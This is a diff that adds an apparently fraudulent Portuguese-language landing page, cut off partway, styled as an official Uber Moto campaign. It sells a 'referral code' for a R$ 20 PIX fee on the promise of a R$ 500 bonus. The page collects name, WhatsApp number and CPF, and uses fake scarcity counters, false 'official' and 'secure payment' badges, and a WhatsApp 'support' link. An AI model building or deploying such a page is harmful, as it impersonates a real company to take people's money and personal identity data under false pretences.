@@ -1,0 +1,1446 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Uber Moto | Cupom R$ 500 pelas primeiras 30 corridas</title>
+    <link rel="icon" href="https://tb-static.uber.com/prod/udam-assets/e24f1914-1e23-4896-ad77-22e88c37c2f9.svg" type="image/svg+xml">
+    
+    <!-- Fonte Uber Sans / Inter -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    
+    <!-- Scripts: QR Code local instantâneo & Confetti -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
+    
+    <style>
+        :root {
+            --uber-black: #000000;
+            --uber-white: #ffffff;
+            --uber-gray-50: #fbfbfb;
+            --uber-gray-100: #f3f3f3;
+            --uber-gray-200: #e2e2e2;
+            --uber-gray-300: #cccccc;
+            --uber-gray-400: #898989;
+            --uber-gray-600: #545454;
+            --uber-gray-800: #1a1a1a;
+            --uber-green: #06c167;
+            --uber-green-light: #e6f9ed;
+            --uber-yellow-bg: #fff9e6;
+            --uber-yellow-border: #ffe28a;
+            --font-uber: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: var(--font-uber);
+            -webkit-font-smoothing: antialiased;
+        }
+
+        body {
+            background-color: var(--uber-white);
+            color: var(--uber-black);
+            line-height: 1.5;
+        }
+
+        /* 1. TOP NAVBAR (LIMPA, FOCO EM VENDAS, COM BOTÃO DE SUPORTE WHATSAPP) */
+        header.uber-navbar {
+            background-color: var(--uber-black);
+            color: var(--uber-white);
+            height: 60px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 32px;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+        }
+
+        .navbar-left {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .uber-logo {
+            font-size: 24px;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+            color: var(--uber-white);
+            text-decoration: none;
+        }
+
+        .navbar-category-pill {
+            background-color: rgba(255, 255, 255, 0.15);
+            color: var(--uber-white);
+            font-size: 13px;
+            font-weight: 600;
+            padding: 4px 12px;
+            border-radius: 20px;
+        }
+
+        .navbar-right {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .campaign-live-pill {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            background-color: rgba(255, 255, 255, 0.1);
+            color: var(--uber-white);
+            font-size: 13px;
+            font-weight: 600;
+            padding: 6px 14px;
+            border-radius: 20px;
+        }
+
+        .live-dot {
+            width: 8px;
+            height: 8px;
+            background-color: var(--uber-green);
+            border-radius: 50%;
+            box-shadow: 0 0 8px var(--uber-green);
+        }
+
+        .nav-whatsapp-btn {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            background-color: #25d366;
+            color: #ffffff;
+            font-size: 13px;
+            font-weight: 700;
+            text-decoration: none;
+            padding: 6px 14px;
+            border-radius: 20px;
+            transition: opacity 0.2s, transform 0.1s;
+        }
+
+        .nav-whatsapp-btn:hover {
+            opacity: 0.95;
+            transform: scale(1.02);
+            color: #ffffff;
+        }
+
+        /* 2. SUB-BANNER DA CAMPANHA */
+        .promo-incentive-bar {
+            background-color: var(--uber-gray-100);
+            border-bottom: 1px solid var(--uber-gray-200);
+            padding: 14px 32px;
+        }
+
+        .promo-bar-container {
+            max-width: 1140px;
+            margin: 0 auto;
+            display: flex;
+            align-items: center;
+            gap: 14px;
+        }
+
+        .promo-bar-icon img {
+            width: 36px;
+            height: 36px;
+            display: block;
+        }
+
+        .promo-bar-content {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .promo-bar-title {
+            font-size: 16px;
+            font-weight: 800;
+            color: var(--uber-black);
+            letter-spacing: -0.3px;
+        }
+
+        .promo-bar-subtitle {
+            font-size: 12px;
+            color: var(--uber-gray-600);
+        }
+
+        /* 3. HERO & CHECKOUT CONTAINER */
+        .hero-section {
+            background-color: var(--uber-white);
+            padding: 40px 32px 56px;
+            border-bottom: 1px solid var(--uber-gray-200);
+        }
+
+        .hero-container {
+            max-width: 1140px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: 1.15fr 0.85fr;
+            gap: 40px;
+            align-items: start;
+        }
+
+        .hero-left {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .badge-uber-tag {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background-color: var(--uber-black);
+            color: var(--uber-white);
+            font-size: 11px;
+            font-weight: 800;
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+            padding: 5px 12px;
+            border-radius: 20px;
+            width: fit-content;
+            margin-bottom: 16px;
+        }
+
+        .hero-title {
+            font-size: 38px;
+            font-weight: 900;
+            line-height: 1.15;
+            letter-spacing: -1px;
+            color: var(--uber-black);
+            margin-bottom: 12px;
+        }
+
+        .hero-lead {
+            font-size: 16px;
+            color: var(--uber-gray-600);
+            line-height: 1.5;
+            margin-bottom: 24px;
+        }
+
+        /* FOTO MOBILE ELEGANTE E PROPORCIONADA */
+        .mobile-hero-photo {
+            display: none;
+            width: 100%;
+            height: 200px;
+            border-radius: 14px;
+            object-fit: cover;
+            margin-bottom: 20px;
+            border: 1px solid var(--uber-gray-200);
+            box-shadow: 0 4px 12px rgba(0,0,0,0.06);
+        }
+
+        /* CARD DE CHECKOUT (ESTILO CARD UBER) */
+        .checkout-card {
+            background: var(--uber-white);
+            border: 1px solid var(--uber-gray-200);
+            border-radius: 16px;
+            padding: 28px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
+        }
+
+        /* AVISOS CRÍTICOS (CONTA NOVA + UBER MOTO) */
+        .critical-box {
+            background-color: var(--uber-yellow-bg);
+            border: 1px solid var(--uber-yellow-border);
+            border-radius: 12px;
+            padding: 14px 16px;
+            margin-bottom: 22px;
+        }
+
+        .critical-header {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 13px;
+            font-weight: 800;
+            color: #8c5b00;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .critical-list {
+            list-style: none;
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+
+        .critical-list li {
+            font-size: 13px;
+            color: #5c3c00;
+            display: flex;
+            align-items: flex-start;
+            gap: 8px;
+            line-height: 1.4;
+        }
+
+        .critical-list li strong {
+            color: #2e1e00;
+        }
+
+        /* BOX PREÇO & ESTOQUE */
+        .price-strip {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding-bottom: 18px;
+            margin-bottom: 18px;
+            border-bottom: 1px solid var(--uber-gray-200);
+        }
+
+        .price-value-box .label {
+            font-size: 11px;
+            font-weight: 700;
+            color: var(--uber-gray-600);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .price-value-box .value {
+            font-size: 32px;
+            font-weight: 900;
+            color: var(--uber-black);
+            letter-spacing: -1px;
+            display: flex;
+            align-items: baseline;
+            gap: 8px;
+        }
+
+        .price-value-box .old-val {
+            font-size: 16px;
+            color: var(--uber-gray-400);
+            text-decoration: line-through;
+            font-weight: 500;
+        }
+
+        .stock-pill {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            background-color: var(--uber-gray-100);
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 700;
+            color: var(--uber-gray-800);
+        }
+
+        .stock-dot {
+            width: 8px;
+            height: 8px;
+            background-color: var(--uber-green);
+            border-radius: 50%;
+            animation: pulse-dot 2s infinite;
+        }
+
+        @keyframes pulse-dot {
+            0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(6, 193, 103, 0.7); }
+            70% { transform: scale(1); box-shadow: 0 0 0 6px rgba(6, 193, 103, 0); }
+            100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(6, 193, 103, 0); }
+        }
+
+        /* FORMULÁRIO */
+        .form-row {
+            margin-bottom: 16px;
+        }
+
+        .form-label {
+            display: block;
+            font-size: 13px;
+            font-weight: 700;
+            color: var(--uber-gray-800);
+            margin-bottom: 6px;
+        }
+
+        .uber-input {
+            width: 100%;
+            height: 48px;
+            padding: 0 16px;
+            font-size: 15px;
+            border: 1.5px solid var(--uber-gray-200);
+            border-radius: 8px;
+            background-color: var(--uber-gray-50);
+            color: var(--uber-black);
+            transition: all 0.2s;
+        }
+
+        .uber-input:focus {
+            outline: none;
+            border-color: var(--uber-black);
+            background-color: var(--uber-white);
+        }
+
+        .btn-uber-primary {
+            width: 100%;
+            height: 52px;
+            background-color: var(--uber-black);
+            color: var(--uber-white);
+            border: none;
+            border-radius: 8px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            transition: background-color 0.2s, transform 0.1s;
+            margin-top: 10px;
+        }
+
+        .btn-uber-primary:hover {
+            background-color: #222222;
+        }
+
+        .btn-uber-primary:active {
+            transform: scale(0.99);
+        }
+
+        .btn-uber-primary:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .security-row {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-top: 18px;
+            padding-top: 14px;
+            border-top: 1px solid var(--uber-gray-200);
+            font-size: 12px;
+            color: var(--uber-gray-600);
+            flex-wrap: wrap;
+            gap: 8px;
+        }
+
+        .security-item {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        /* HERO DIREITA (FOTO DESKTOP OFICIAL UBER MOTO) */
+        .hero-right {
+            position: relative;
+        }
+
+        .photo-card-wrap {
+            position: sticky;
+            top: 88px;
+        }
+
+        .uber-main-photo {
+            width: 100%;
+            height: 480px;
+            border-radius: 16px;
+            display: block;
+            object-fit: cover;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.08);
+            border: 1px solid var(--uber-gray-200);
+        }
+
+        .photo-caption-tag {
+            position: absolute;
+            bottom: 16px;
+            left: 16px;
+            right: 16px;
+            background: rgba(0, 0, 0, 0.88);
+            backdrop-filter: blur(8px);
+            color: var(--uber-white);
+            padding: 12px 16px;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .photo-caption-title {
+            font-size: 13px;
+            font-weight: 700;
+        }
+
+        .photo-caption-sub {
+            font-size: 11px;
+            color: #d2d2d2;
+        }
+
+        .badge-verified-uber {
+            background-color: var(--uber-white);
+            color: var(--uber-black);
+            font-size: 11px;
+            font-weight: 800;
+            padding: 3px 8px;
+            border-radius: 6px;
+            text-transform: uppercase;
+        }
+
+        /* 4. TELA DE PAGAMENTO PIX (BSPAY) */
+        #pix-area {
+            display: none;
+            text-align: center;
+            padding: 8px 0;
+        }
+
+        .pix-header-title {
+            font-size: 18px;
+            font-weight: 800;
+            margin-bottom: 4px;
+        }
+
+        .pix-header-subtitle {
+            font-size: 13px;
+            color: var(--uber-gray-600);
+            margin-bottom: 16px;
+        }
+
+        .pix-qrcode-box {
+            background-color: var(--uber-white);
+            padding: 14px;
+            border: 2px solid var(--uber-black);
+            border-radius: 12px;
+            display: inline-block;
+            margin-bottom: 14px;
+        }
+
+        #qrcode-canvas-wrap canvas,
+        #qrcode-canvas-wrap img {
+            width: 200px !important;
+            height: 200px !important;
+            display: block;
+            margin: 0 auto;
+        }
+
+        .pix-copy-box {
+            background-color: var(--uber-gray-100);
+            border: 1px solid var(--uber-gray-200);
+            border-radius: 8px;
+            padding: 10px;
+            margin-bottom: 12px;
+            word-break: break-all;
+            font-family: monospace;
+            font-size: 11px;
+            color: var(--uber-gray-800);
+            max-height: 60px;
+            overflow-y: auto;
+            text-align: left;
+        }
+
+        .btn-copy-pix {
+            width: 100%;
+            height: 48px;
+            background-color: var(--uber-black);
+            color: var(--uber-white);
+            border: none;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 700;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            transition: all 0.2s;
+        }
+
+        .btn-copy-pix:hover {
+            background-color: #222222;
+        }
+
+        .pix-polling-status {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 14px;
+            font-size: 12px;
+            color: var(--uber-gray-600);
+        }
+
+        .spinner-uber {
+            width: 14px;
+            height: 14px;
+            border: 2px solid var(--uber-gray-200);
+            border-top: 2px solid var(--uber-black);
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* 5. TELA DE SUCESSO E CÓDIGO ENTREGUE */
+        #success-area {
+            display: none;
+            text-align: center;
+            padding: 8px 0;
+        }
+
+        .success-badge-icon {
+            width: 56px;
+            height: 56px;
+            background-color: var(--uber-green-light);
+            color: var(--uber-green);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 14px;
+        }
+
+        .code-display-card {
+            background-color: var(--uber-gray-100);
+            border: 2px dashed var(--uber-black);
+            border-radius: 12px;
+            padding: 16px;
+            margin: 16px 0;
+        }
+
+        .code-label {
+            font-size: 11px;
+            font-weight: 700;
+            color: var(--uber-gray-600);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 4px;
+        }
+
+        .code-val {
+            font-size: 28px;
+            font-weight: 900;
+            color: var(--uber-black);
+            letter-spacing: 2px;
+            font-family: monospace;
+        }
+
+        .btn-copy-code {
+            width: 100%;
+            height: 50px;
+            background-color: var(--uber-green);
+            color: var(--uber-white);
+            border: none;
+            border-radius: 8px;
+            font-size: 15px;
+            font-weight: 800;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .tutorial-card {
+            background-color: var(--uber-white);
+            border: 1px solid var(--uber-gray-200);
+            border-radius: 12px;
+            padding: 18px;
+            text-align: left;
+        }
+
+        .tutorial-title {
+            font-size: 13px;
+            font-weight: 800;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .tutorial-steps {
+            list-style: none;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            font-size: 12px;
+            color: var(--uber-gray-800);
+        }
+
+        .tutorial-steps li {
+            display: flex;
+            align-items: flex-start;
+            gap: 8px;
+            line-height: 1.4;
+        }
+
+        .tutorial-num {
+            width: 20px;
+            height: 20px;
+            background-color: var(--uber-black);
+            color: var(--uber-white);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 11px;
+            font-weight: 700;
+            flex-shrink: 0;
+        }
+
+        /* 6. COMO FUNCIONA O BÔNUS (3 PASSOS RÁPIDOS) */
+        .steps-section {
+            background-color: var(--uber-gray-50);
+            padding: 56px 32px;
+            border-bottom: 1px solid var(--uber-gray-200);
+        }
+
+        .steps-container {
+            max-width: 1140px;
+            margin: 0 auto;
+        }
+
+        .section-header {
+            text-align: center;
+            max-width: 640px;
+            margin: 0 auto 40px;
+        }
+
+        .section-header h2 {
+            font-size: 28px;
+            font-weight: 800;
+            letter-spacing: -0.8px;
+            color: var(--uber-black);
+            line-height: 1.2;
+            margin-bottom: 8px;
+        }
+
+        .section-header p {
+            font-size: 15px;
+            color: var(--uber-gray-600);
+        }
+
+        .steps-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 24px;
+        }
+
+        .step-box {
+            background-color: var(--uber-white);
+            border: 1px solid var(--uber-gray-200);
+            border-radius: 14px;
+            padding: 24px;
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.02);
+        }
+
+        .step-circle {
+            width: 36px;
+            height: 36px;
+            background-color: var(--uber-black);
+            color: var(--uber-white);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 15px;
+            font-weight: 800;
+            margin-bottom: 16px;
+        }
+
+        .step-title {
+            font-size: 17px;
+            font-weight: 800;
+            color: var(--uber-black);
+            margin-bottom: 8px;
+        }
+
+        .step-desc {
+            font-size: 13px;
+            color: var(--uber-gray-600);
+            line-height: 1.5;
+        }
+
+        /* 7. PERGUNTAS FREQUENTES (FAQ) */
+        .faq-section {
+            background-color: var(--uber-white);
+            padding: 56px 32px;
+            border-bottom: 1px solid var(--uber-gray-200);
+        }
+
+        .faq-container {
+            max-width: 800px;
+            margin: 0 auto;
+        }
+
+        .faq-item {
+            border-bottom: 1px solid var(--uber-gray-200);
+            padding: 18px 0;
+        }
+
+        .faq-question {
+            font-size: 16px;
+            font-weight: 700;
+            color: var(--uber-black);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .faq-answer {
+            font-size: 14px;
+            color: var(--uber-gray-600);
+            line-height: 1.5;
+            margin-top: 10px;
+        }
+
+        /* 8. FOOTER LIMPO */
+        footer.uber-footer {
+            background-color: var(--uber-black);
+            color: var(--uber-white);
+            padding: 40px 32px 32px;
+        }
+
+        .footer-container {
+            max-width: 1140px;
+            margin: 0 auto;
+        }
+
+        .footer-top {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding-bottom: 24px;
+            border-bottom: 1px solid var(--uber-gray-800);
+            margin-bottom: 24px;
+        }
+
+        .footer-logo {
+            font-size: 22px;
+            font-weight: 800;
+            color: var(--uber-white);
+        }
+
+        .footer-disclaimer {
+            font-size: 11px;
+            color: var(--uber-gray-400);
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+
+        .footer-bottom {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            font-size: 12px;
+            color: var(--uber-gray-400);
+        }
+
+        /* BOTÃO FLUTUANTE WHATSAPP (APENAS ÍCONE CIRCULAR) */
+        .floating-whatsapp-btn {
+            position: fixed;
+            bottom: 24px;
+            right: 24px;
+            width: 56px;
+            height: 56px;
+            background-color: #25d366;
+            color: #ffffff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-decoration: none;
+            box-shadow: 0 4px 18px rgba(37, 211, 102, 0.45);
+            z-index: 9999;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+
+        .floating-whatsapp-btn:hover {
+            transform: scale(1.08);
+            box-shadow: 0 6px 24px rgba(37, 211, 102, 0.65);
+            color: #ffffff;
+        }
+
+        .floating-whatsapp-btn svg {
+            width: 32px;
+            height: 32px;
+            display: block;
+        }
+
+        /* RESPONSIVIDADE MOBILE IMPECÁVEL */
+        @media (max-width: 900px) {
+            header.uber-navbar {
+                padding: 0 16px;
+            }
+            .promo-incentive-bar,
+            .hero-section,
+            .steps-section,
+            .faq-section,
+            footer.uber-footer {
+                padding-left: 16px;
+                padding-right: 16px;
+            }
+            .hero-container {
+                grid-template-columns: 1fr;
+                gap: 24px;
+            }
+            .hero-right {
+                display: none;
+            }
+            .mobile-hero-photo {
+                display: block;
+            }
+            .steps-grid {
+                grid-template-columns: 1fr;
+                gap: 16px;
+            }
+            .hero-title {
+                font-size: 26px;
+                letter-spacing: -0.5px;
+            }
+            .checkout-card {
+                padding: 20px 16px;
+            }
+            .price-strip {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 10px;
+            }
+            .price-value-box .value {
+                font-size: 28px;
+            }
+            .footer-bottom {
+                flex-direction: column;
+                gap: 12px;
+                align-items: flex-start;
+            }
+            .floating-whatsapp-btn {
+                bottom: 18px;
+                right: 18px;
+                width: 50px;
+                height: 50px;
+            }
+            .floating-whatsapp-btn svg {
+                width: 28px;
+                height: 28px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- 1. TOP NAVBAR (OFICIAL UBER, COM BOTÃO DE SUPORTE) -->
+    <header class="uber-navbar">
+        <div class="navbar-left">
+            <span class="uber-logo">Uber</span>
+            <span class="navbar-category-pill">Moto</span>
+        </div>
+        <div class="navbar-right">
+            <div class="campaign-live-pill">
+                <div class="live-dot"></div>
+                <span>Campanha Ativa</span>
+            </div>
+            <a href="https://wa.me/5522997201054?text=Ol%C3%A1%2C%20preciso%20de%20ajuda%20ou%20suporte%20com%20o%20c%C3%B3digo%20Uber%20Moto" target="_blank" rel="noopener noreferrer" class="nav-whatsapp-btn" title="Suporte via WhatsApp">
+                <svg width="15" height="15" viewBox="0 0 24 24" fill="currentColor"><path d="M12.031 6.172c-3.181 0-5.767 2.586-5.768 5.766-.001 1.298.38 2.27 1.019 3.287l-.582 2.128 2.182-.573c.978.58 1.911.928 3.145.929 3.178 0 5.767-2.587 5.768-5.766.001-3.187-2.575-5.77-5.764-5.771zm3.392 8.244c-.144.405-.837.774-1.17.824-.312.045-.693.08-2.227-.552-1.745-.719-2.846-2.48-2.934-2.597-.086-.118-.707-.939-.707-1.791 0-.853.447-1.272.607-1.446.16-.174.348-.217.464-.217.116 0 .232.002.333.007.106.005.249-.04.39.298.144.347.491 1.2.535 1.287.043.087.072.188.014.303-.058.116-.087.188-.173.289l-.26.304c-.087.086-.177.18-.076.354.101.174.449.741.964 1.201.662.591 1.221.774 1.394.86.174.086.275.072.376-.044.101-.116.433-.506.549-.68.116-.174.231-.145.39-.087s1.011.477 1.184.564c.174.087.289.13.332.202.043.073.043.419-.101.824z"/></svg>
+                <span>Suporte</span>
+            </a>
+        </div>
+    </header>
+
+    <!-- 2. SUB-BANNER DA CAMPANHA (COM ÍCONE OFICIAL CASH IN HAND) -->
+    <div class="promo-incentive-bar">
+        <div class="promo-bar-container">
+            <div class="promo-bar-icon">
+                <img src="/assets/cash_in_hand.svg" alt="Uber Promoção" width="36" height="36">
+            </div>
+            <div class="promo-bar-content">
+                <div class="promo-bar-title">Ganhe R$ 500 a mais pelas primeiras 30 viagens de Uber Moto</div>
+                <div class="promo-bar-subtitle">Campanha oficial de incentivo para novos parceiros.*</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- 3. HERO & CHECKOUT SECTION -->
+    <main class="hero-section">
+        <div class="hero-container">
+            
+            <!-- COLUNA ESQUERDA: APRESENTAÇÃO E CHECKOUT -->
+            <div class="hero-left">
+                <div class="badge-uber-tag">
+                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>
+                    CAMPANHA OFICIAL • CONTAS NOVAS
+                </div>
+
+                <h1 class="hero-title">
+                    CUPOM R$ 500 REAIS<br>
+                    APÓS 30 CORRIDAS UBER MOTO
+                </h1>
+                
+                <p class="hero-lead">
+                    Adquira seu código de indicação oficial para novos parceiros. Ative no seu cadastro, complete 30 corridas na categoria <strong>Uber Moto</strong> e garanta o bônus de <strong>R$ 500,00</strong> direto na sua conta bancária.
+                </p>
+
+                <!-- FOTO MOBILE MODERNA E BEM PROPORCIONADA -->
+                <img src="/assets/uber_moto_pro.png" alt="Motorista parceiro Uber Moto" class="mobile-hero-photo">
+
+                <!-- CARD DE CHECKOUT -->
+                <div class="checkout-card" id="main-checkout-card">
+
+                    <!-- ETAPA 1: FORMULÁRIO -->
+                    <div id="checkout-form-area">
+
+                        <!-- AVISOS OBRIGATÓRIOS DA CAMPANHA -->
+                        <div class="critical-box">
+                            <div class="critical-header">
+                                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><line x1="12" x2="12" y1="8" y2="12"/><line x1="12" x2="12.01" y1="16" y2="16"/></svg>
+                                Requisitos Obrigatórios da Campanha
+                            </div>
+                            <ul class="critical-list">
+                                <li>
+                                    <span>•</span>
+                                    <span><strong>Exclusivo para Contas Novas:</strong> Válido exclusivamente para o primeiro cadastro de motorista/entregador parceiro na Uber.</span>
+                                </li>
+                                <li>
+                                    <span>•</span>
+                                    <span><strong>Somente Categoria Uber Moto:</strong> O bônus de R$ 500 é creditado após completar as primeiras 30 corridas de moto.</span>
+                                </li>
+                            </ul>
+                        </div>
+
+                        <!-- FAIXA DE PREÇO E ESTOQUE -->
+                        <div class="price-strip">
+                            <div class="price-value-box">
+                                <div class="label">Taxa Única de Emissão do Código</div>
+                                <div class="value">
+                                    R$ 20,00 <span class="old-val">R$ 79,90</span>
+                                </div>
+                            </div>
+                            <div class="stock-pill">
+                                <div class="stock-dot"></div>
+                                <span id="estoque-count">3.200+</span> Códigos Disponíveis
+                            </div>
+                        </div>
+
+                        <!-- FORMULÁRIO PIX -->
+                        <form id="form-checkout" onsubmit="realizarCheckout(event)">
+                            <div class="form-row">
+                                <label class="form-label" for="input-nome">Nome Completo</label>
+                                <input type="text" id="input-nome" class="uber-input" placeholder="Ex: Roberto Gomes" required>
+                            </div>
+
+                            <div class="form-row">
+                                <label class="form-label" for="input-contato">WhatsApp / Telefone</label>
+                                <input type="tel" id="input-contato" class="uber-input" placeholder="(00) 90000-0000" required>
+                            </div>
+
+                            <div class="form-row">
+                                <label class="form-label" for="input-cpf">CPF (Titular do Pagamento PIX)</label>
+                                <input type="text" id="input-cpf" class="uber-input" placeholder="000.000.000-00" maxlength="14" required>
+                            </div>
+
+                            <button type="submit" class="btn-uber-primary" id="btn-submit-order">
+                                <span>PAGAR VIA PIX (R$ 20,00) & LIBERAR CÓDIGO</span>
+                                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="5" x2="19" y1="12" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
+                            </button>
+                        </form>
+
+                        <div class="security-row">
+                            <div class="security-item">
+                                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>
+                                <span>Entrega Imediata na Tela</span>
+                            </div>
+                            <div class="security-item">
+                                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+                                <span>Pagamento Seguro BsPay</span>
+                            </div>
+                            <div class="security-item">
+                                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
+                                <span>Código Oficial Uber</span>
+                            </div>
+                        </div>
+
+                    </div>
+
+                    <!-- ETAPA 2: COBRANÇA PIX GERADA -->
+                    <div id="pix-area">
+                        <div class="pix-header-title">Pagamento via PIX</div>
+                        <div class="pix-header-subtitle">Abra o app do seu banco e escaneie o QR Code ou use o Pix Copia e Cola:</div>
+
+                        <div class="pix-qrcode-box">
+                            <div id="qrcode-canvas-wrap"></div>
+                        </div>
+
+                        <div class="pix-copy-box" id="pix-copia-cola-text">
+                            Carregando chave PIX...
+                        </div>
+
+                        <button type="button" class="btn-copy-pix" onclick="copiarPixCopiaCola()">
+                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
+                            <span>COPIAR CHAVE PIX COPIA E COLA</span>
+                        </button>
+
+                        <div class="pix-polling-status">
+                            <div class="spinner-uber"></div>
+                            <span>Aguardando confirmação do pagamento pelo banco...</span>
+                        </div>
+                    </div>
+
+                    <!-- ETAPA 3: SUCESSO E CÓDIGO ENTREGUE -->
+                    <div id="success-area">
+                        <div class="success-badge-icon">
+                            <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><polyline points="20 6 9 17 4 12"/></svg>
+                        </div>
+                        
+                        <h2 style="font-size: 20px; font-weight: 800; margin-bottom: 6px;">Pagamento Confirmado!</h2>
+                        <p style="font-size: 13px; color: var(--uber-gray-600); margin-bottom: 16px;">Seu código promocional foi liberado e já está pronto para ativação:</p>
+
+                        <div class="code-display-card">
+                            <div class="code-label">SEU CÓDIGO DE INDICAÇÃO OFICIAL</div>
+                            <div class="code-val" id="codigo-gerado">CARREGANDO...</div>
+                        </div>
+
+                        <button type="button" class="btn-copy-code" onclick="copiarCodigoEntregue()">
+                            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
+                            <span>COPIAR CÓDIGO PROMOCIONAL</span>
+                        </button>
+
+                        <div class="tutorial-card">
+                            <div class="tutorial-title">
+                                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><line x1="12" x2="12" y1="16" y2="12"/><line x1="12" x2="12.01" y1="8" y2="8"/></svg>
+                                Como ativar e receber os R$ 500:
+                            </div>
+                            <ul class="tutorial-steps">
+                                <li>
+                                    <div class="tutorial-num">1</div>
+                                    <div>Baixe o app <strong>Uber Driver</strong> ou acesse o site oficial da Uber.</div>
+                                </li>
+                                <li>
